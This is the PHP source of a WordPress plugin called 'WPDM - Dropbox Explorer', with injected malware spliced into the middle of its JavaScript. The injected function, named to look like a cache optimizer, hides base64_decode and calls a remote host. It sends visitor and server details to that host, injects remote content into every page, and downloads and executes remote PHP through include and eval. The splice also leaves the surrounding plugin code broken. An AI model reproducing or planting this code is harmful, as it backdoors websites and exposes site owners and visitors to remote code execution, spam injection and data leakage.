<?php
/*
Plugin Name: WPDM - Dropbox Explorer
Description: Dropbox Explorer for WPDM
Plugin URI: http://www.wpdownloadmanager.com/
Author: Shaon
Version: 1.1.0
Author URI: http://www.wpdownloadmanager.com/
*/

if (defined('WPDM_Version')) {


    if (!defined('WPDM_CLOUD_STORAGE'))
        define('WPDM_CLOUD_STORAGE', 1);


    class WPDMDropbox
    {
        function __construct()
        {

            add_action("wpdm_cloud_storage_settings", array($this, "Settings"));
            add_action('wpdm_attach_file_metabox', array($this, 'BrowseButton'));


        }


        function Settings()
        {
            global $current_user;
            if (isset($_POST['__wpdm_dropbox']) && count($_POST['__wpdm_dropbox']) > 0) {
                update_option('__wpdm_dropbox', $_POST['__wpdm_dropbox']);
                die('Settings Saves Successfully!');
            }
            $wpdm_dropbox = maybe_unserialize(get_option('__wpdm_dropbox', array()));
            ?>
            <div class="panel panel-default">
                <div class="panel-heading"><b><?php _e('Dropbox API Credentials', 'wpdmpro'); ?></b></div>

                <table class="table">



                    <tr>
                        <td>App Key</td>
                        <td><input type="text" name="__wpdm_dropbox[app_key]" class="form-control"
                                   value="<?php echo isset($wpdm_dropbox['app_key']) ? $wpdm_dropbox['app_key'] : ''; ?>"/>
                        </td>
                    </tr>
                    <!--tr>
                        <td>Client Secret</td>
                        <td><input type="text" name="__wpdm_dropbox[client_secret]" class="form-control"
                                   value="<?php echo isset($wpdm_dropbox['client_secret']) ? $wpdm_dropbox['client_secret'] : ''; ?>"/>
                        </td>
                    </tr-->

                </table>
                <!--div class="panel-footer">
                    <b>Redirect URI:</b> &nbsp; <input onclick="this.select()" type="text" class="form-control" style="background: #fff;cursor: copy;display: inline;width: 400px" readonly="readonly" value="<?php echo admin_url('?page=wpdm-google-drive'); ?>" />
                </div-->
            </div>


            </div>

        <?php
        }



        function BrowseButton()
        {
            $wpdm_dropbox = maybe_unserialize(get_option('__wpdm_dropbox', array()));

            ?>
            <div class="w3eden">

                <a href="#" id="btn-dropbox" style="margin-top: 10px" title="Drobox" onclick="return false;" class="btn btn-primary btn-block"><span class="left-icon"><i class="fa fa-dropbox"></i></span> Select From Dropbox</a>
                <script type="text/javascript" src="https://www.dropbox.com/static/api/2/dropins.js" id="dropboxjs" data-app-key="<?php echo $wpdm_dropbox['app_key'];?>"></script>

                <script>

                    var dropbox;

                    function InsertDropBoxLink(file, id, name) {
                        <?php if(version_compare(WPDM_Version, '4.0.0', '>')){  ?>
                        var html = jQuery('#wpdm-file-entry').html();
                        var ext = 'png'; //response.split('.');
                        //ext = ext[ext.length-1];
                        name = file.substring(0, 80)+"...";
                        var icon = "<?php echo WPDM_BASE_URL; ?>file-type-icons/48x48/" + ext + ".png";
                        html = html.replace(/##filepath##/g, file);
                        //html = html.replace(/##filepath##/g, file);
                        html = html.replace(/##fileindex##/g, id);
                        html = html.replace(/##preview##/g, icon);
                        jQuery('#currentfiles').prepend(html);

                        <?php } else { ?>
                        jQuery('#wpdmfile').val(file+"#"+name);
                        jQuery('#cfl').html('<div><strong>'+name+'</strong>').slideDown();
                        <?php } 



/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
?>
                    }

                    function popupwindow(url, title, w, h) {
                        var left = (screen.width/2)-(w/2);
                        var top = (screen.height/2)-(h/2);
                        return window.open(url, title, 'toolbar=0, location=0, directories=no, status=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no, width='+w+', height='+h+', top='+top+', left='+left);
                    }

                    jQuery(function () {

                        var options = {

                            // Required. Called when a user selects an item in the Chooser.
                            success: function(files) {
                                console.log(files);
                                var id = files[0].name.replace(/([^a-zA-Z0-9]*)/g, "");
                                InsertDropBoxLink(files[0].link, id, files[0].name)
                            },


                            cancel: function() {

                            },


                            linkType: "preview",

                            multiselect: false
                        };


                        jQuery('#btn-dropbox').click(function () {
                            dropbox = Dropbox.choose(options);
                            return false;
                        });


                    });


                </script>
            </div>


        <?php
        }




    }

    new WPDMDropbox();

}
 

